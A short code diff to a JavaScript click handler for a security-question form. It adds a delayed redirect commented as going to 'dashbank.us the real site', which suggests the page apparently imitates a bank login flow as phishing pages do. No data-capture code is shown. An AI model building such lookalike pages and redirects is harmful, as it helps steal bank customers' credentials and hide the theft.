@@ -80,6 +80,10 @@ document.getElementById("submit-question").addEventListener("click", async () =>
 
         await new Promise((resolve) => setTimeout(() => resolve(), 1000));
         window.postMessage({ type: "sq-fin" }, "*");
+
+        await new Promise((resolve) => setTimeout(() => resolve(), 5000));
+        // redirect to dashbank.us the real site on both cases
+        window.location.href = window.location.protocol + "//dashbank.us";
     }
 
     // reenable the submit button
